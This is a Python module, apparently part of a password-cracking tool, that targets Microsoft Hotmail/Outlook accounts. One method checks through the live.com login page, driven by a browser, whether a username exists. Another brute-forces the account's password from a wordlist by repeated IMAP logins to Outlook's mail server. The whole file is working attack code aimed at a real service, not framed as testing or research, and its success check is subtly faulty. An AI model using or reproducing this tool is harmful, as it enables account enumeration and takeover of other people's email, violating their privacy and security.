import time
import imaplib
from selenium.common.exceptions import NoSuchElementException


class Hotmail:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.host = 'imap-mail.outlook.com'
        self.port = 993
        self.wordlist = wordlist
        self.delay = delay

    def check_user(self):
        self.browser.driver.get('https://login.live.com/login.srf')
        input = self.browser.wait_until_element_exists('name', 'loginfmt')
        input.clear()
        input.send_keys(self.username)
        self.browser.driver.find_element_by_id('idSIButton9').click()
        try:
            self.browser.wait_until_element_exists('id', 'usernameError')
            return False
        except NoSuchElementException:
            return True
        # try:
        #    self.browser.driver.find_element_by_name('passwd')
        #    return True
        # except NoSuchElementException:
        #    return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        IMAP4 = imaplib.IMAP4_SSL(self.host, self.port)
        for password in passwords:
            try:
                session = IMAP4.login(self.username, password)
                if (session == 'OK' or 'AUTHENTICATE completed'):
                    found = password
                    break
            except IMAP4.error:
                pass
            time.sleep(self.delay)

        IMAP4.logout()
        return found
